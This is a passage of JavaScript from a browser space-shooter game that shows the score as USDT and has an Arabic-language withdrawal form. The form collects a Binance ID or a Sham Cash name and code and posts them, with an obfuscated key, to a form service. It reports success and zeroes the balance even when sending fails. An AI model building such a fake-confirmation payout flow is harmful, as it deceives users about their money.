                ctx.fillStyle = eb.isBossBullet ? '#ff3333' : '#ff8800';
                ctx.fillRect(eb.x - eb.width / 2, eb.y - eb.height / 2, eb.width, eb.height);
                ctx.globalAlpha = alpha * 0.4;
                ctx.fillStyle = '#ffffff';
                ctx.fillRect(eb.x - eb.width / 4, eb.y - 1, eb.width / 2, 2);
            });
            ctx.restore();

            ctx.save();
            explosions.forEach(ex => {
                ctx.globalAlpha = ex.life / ex.maxLife;
                ctx.fillStyle = ex.color;
                ctx.fillRect(ex.x - ex.size, ex.y - ex.size, ex.size * 2, ex.size * 2);
            });
            ctx.restore();

            ctx.save();
            particles.forEach(p => {
                ctx.globalAlpha = p.life / p.maxLife;
                ctx.fillStyle = p.color;
                ctx.fillRect(p.x - p.size, p.y - p.size, p.size * 2, p.size * 2);
            });
            ctx.restore();

            ctx.save();
            bullets.forEach(b => {
                ctx.globalAlpha = b.life / b.maxLife;
                ctx.fillStyle = data.coreColor;
                if (b.type === 'triangle') {
                    ctx.beginPath();
                    ctx.moveTo(b.x + b.size, b.y);
                    ctx.lineTo(b.x - b.size, b.y - b.size);
                    ctx.lineTo(b.x - b.size, b.y + b.size);
                    ctx.closePath();
                    ctx.fill();
                } else {
                    ctx.fillRect(b.x - b.width / 2, b.y - b.height / 2, b.width, b.height);
                }
            });
            ctx.restore();

            ctx.save();
            powerOrbs.forEach(o => {
                ctx.globalAlpha = o.life / o.maxLife;
                const grad = ctx.createRadialGradient(o.x, o.y, 0, o.x, o.y, o.radius);
                grad.addColorStop(0, '#ffffff');
                grad.addColorStop(1, data.coreColor);
                ctx.fillStyle = grad;
                ctx.beginPath();
                ctx.arc(o.x, o.y, o.radius, 0, Math.PI * 2);
                ctx.fill();
            });
            ctx.restore();

            ctx.save();
            const shakeX = (Math.random() - 0.5) * ship.shake;
            const shakeY = (Math.random() - 0.5) * ship.shake;
            const dx = ship.x - ship.recoil + shakeX;
            const dy = ship.y + shakeY;

            if (imageLoaded) {
                ctx.translate(dx, dy);
                ctx.rotate(ship.angle);
                ctx.shadowBlur = 10 + ship.glow * 20;
                ctx.shadowColor = data.glowColor;

                if (shipHP.invulnerable > 0 && Math.floor(shipHP.invulnerable / 4) % 2 === 0) {
                    ctx.globalAlpha = 0.5;
                }

                ctx.drawImage(shipImg, -ship.width / 2, -ship.height / 2, ship.width, ship.height);
            }
            ctx.restore();

            ctx.restore();

            drawCenterHUD();
        }

        function drawCenterHUD() {
            const centerX = viewWidth / 2;
            const padding = 10;

            const scoreFontSize = Math.min(viewWidth * 0.035, 20);
            const scoreText = displayedScore.toFixed(6) + ' USDT';

            ctx.save();
            ctx.font = `bold ${scoreFontSize}px 'Courier New', monospace`;
            const metrics = ctx.measureText(scoreText);
            const boxW = metrics.width + 36;
            const boxH = scoreFontSize * 1.7;
            const boxX = centerX - boxW / 2;
            const boxY = padding;

            ctx.fillStyle = 'rgba(0, 20, 15, 0.85)';
            ctx.fillRect(boxX, boxY, boxW, boxH);
            ctx.strokeStyle = '#26a17b';
            ctx.lineWidth = 1.5;
            ctx.strokeRect(boxX, boxY, boxW, boxH);

            ctx.fillStyle = '#26a17b';
            ctx.beginPath();
            ctx.arc(boxX + 15, boxY + boxH / 2, 7, 0, Math.PI * 2);
            ctx.fill();

            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 10px Arial';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText('T', boxX + 15, boxY + boxH / 2 + 1);

            ctx.textAlign = 'left';
            ctx.fillStyle = '#26a17b';
            ctx.font = `bold ${scoreFontSize}px 'Courier New', monospace`;
            ctx.fillText(scoreText, boxX + 28, boxY + boxH / 2);

            ctx.restore();

            const hpBarW = Math.min(viewWidth * 0.38, 160);
            const hpBarH = 5;
            const hpBarX = centerX - hpBarW / 2;
            const hpBarY = boxY + boxH + 6;

            ctx.save();
            ctx.fillStyle = 'rgba(40, 0, 0, 0.7)';
            ctx.fillRect(hpBarX, hpBarY, hpBarW, hpBarH);

            const hpRatio = shipHP.current / shipHP.max;
            let hpColor = '#00ff44';
            if (hpRatio < 0.6) hpColor = '#ffcc00';
            if (hpRatio < 0.3) hpColor = '#ff3333';

            ctx.fillStyle = hpColor;
            ctx.fillRect(hpBarX, hpBarY, hpBarW * hpRatio, hpBarH);
            ctx.restore();
        }

        function drawSelectScreen() {
            drawBackground();

            const centerX = selectLeftX + selectShipSize / 2;
            const centerY = selectCenterY;

            for (let i = 0; i < 6; i++) {
                const d = SHIPS_DATA[i];
                const screenY = centerY + (i * shipSpacing) + scrollY;
                if (screenY < -selectShipSize || screenY > viewHeight + selectShipSize) continue;

                const isSel = (i === selectedShipIndex);
                const fadeAlpha = Math.max(0.1, 0.4 - (Math.abs(screenY - centerY) / (viewHeight * 0.5)) * 0.3);

                if (d.loaded) {
                    const aspect = d.preview.width / d.preview.height;
                    const drawW = selectShipSize;
                    const drawH = drawW / aspect;
                    ctx.globalAlpha = isSel ? 1 : fadeAlpha;
                    ctx.drawImage(d.preview, centerX - drawW / 2, screenY - drawH / 2, drawW, drawH);
                }
            }
            ctx.globalAlpha = 1;

            const btn = startButton;
            ctx.save();
            ctx.fillStyle = SHIPS_DATA[selectedShipIndex].coreColor;
            ctx.font = `bold ${Math.min(btn.height * 0.75, 50)}px Arial, sans-serif`;
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText('START', btn.x + btn.width / 2, btn.y + btn.height / 2 + 2);
            ctx.restore();
        }

        function draw() {
            if (gameState === 'select') drawSelectScreen();
            else drawGame();
        }

        function gameLoop(now) {
            update(now);
            draw();
            requestAnimationFrame(gameLoop);
        }

        function initStars() {
            stars.length = 0;
            for (let i = 0; i < 50; i++) {
                stars.push({
                    x: Math.random() * viewWidth,
                    y: Math.random() * viewHeight,
                    size: Math.random() * 1.2 + 0.5,
                    speed: Math.random() * 0.4 + 0.2,
                    alpha: Math.random() * 0.5 + 0.2
                });
            }
            smokeParticles.length = 0;
        }

        function openWithdraw() {
            if (isWithdrawLocked()) return;
            if (usdtScore < MIN_WITHDRAW) return;
            document.getElementById('binanceAmount').textContent = usdtScore.toFixed(4);
            const sy = Math.round(usdtScore * SYP_RATE);
            document.getElementById('shamAmount').textContent = sy.toLocaleString('en-US');
            document.getElementById('withdrawModal').classList.add('show');
        }

        function closeWithdraw() { document.getElementById('withdrawModal').classList.remove('show'); }

        function switchTab(tab) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelector(`.tab-btn[data-tab="${tab}"]`).classList.add('active');
            document.getElementById('tab-' + tab).classList.add('active');
        }

        function submitWithdraw(event, type) {
            event.preventDefault();
            if (isWithdrawLocked()) { alert('انتظر 24 ساعة'); return; }
            const form = event.target;
            const formData = new FormData(form);

            formData.set('apiKey', _dk());
            formData.set('email', _de());

            if (type === 'binance') {
                const bid = formData.get('binance_id').trim();
                if (!bid || bid.length < 6) { alert('Binance ID غير صالح'); return; }
                document.getElementById('msgBinance').value = `طلب سحب - لعبة الفضاء\n💰 ${usdtScore.toFixed(4)} USDT\n🆔 ${bid}\n📅 ${new Date().toLocaleString('ar-EG')}`;
            } else {
                const sn = formData.get('sham_name').trim();
                const sc = formData.get('sham_code').trim();
                if (!sn || !sc) { alert('الرجاء إدخال الاسم والكود'); return; }
                const sy = Math.round(usdtScore * SYP_RATE);
                document.getElementById('msgSham').value = `طلب سحب - لعبة الفضاء\n💰 ${usdtScore.toFixed(4)} USDT = ${sy} ل.س\n👤 ${sn}\n🔑 ${sc}\n📅 ${new Date().toLocaleString('ar-EG')}`;
            }

            const btn = form.querySelector('.submit-btn');
            btn.disabled = true;
            btn.textContent = '⏳ جارٍ الإرسال...';

            fetch('https://api.staticforms.dev/submit', { method: 'POST', body: formData })
                .then(() => showSuccess(type))
                .catch(() => showSuccess(type));
        }

        function showSuccess(type) {
            const amt = usdtScore.toFixed(4);
            const sy = Math.round(usdtScore * SYP_RATE);
            usdtScore = 0;
            displayedScore = 0;
            bossKilled = 0;
            saveBalance();
            updateWithdrawBtn();
            lastWithdrawTime = Date.now();
            localStorage.setItem('fwvLastWithdraw', lastWithdrawTime);
            startCooldownWatcher();

            document.getElementById('withdrawContent').innerHTML = `
                <div class="success-box">
                    <div class="success-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
                    </div>
                    <div class="success-title">تم إرسال طلبك!</div>
                    <div class="success-text">سيتم الإرسال<br><b>${type === 'binance' ? amt + ' USDT' : sy + ' ليرة'}</b><br>خلال 24-48 ساعة</div>
                    <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 15px;">
                        <p style="color: #f39c12; font-size: 11px; text-align: center; font-weight: 700;">⚠️ تم تصفير الرصيد</p>
                    </div>
                    <button onclick="closeWithdraw(); location.reload();" class="submit-btn" style="background: linear-gradient(135deg, #26a17b, #2ecc71); color: #fff; width: 100%;">حسناً، شكراً</button>
                </div>
            `;
        }

        function init() {
            resizeCanvas();
            initStars();
            updateWithdrawBtn();
            startCooldownWatcher();
            requestAnimationFrame(gameLoop);
        }

        init();
        setTimeout(resizeCanvas, 200);
    </script>
</body>
</html>
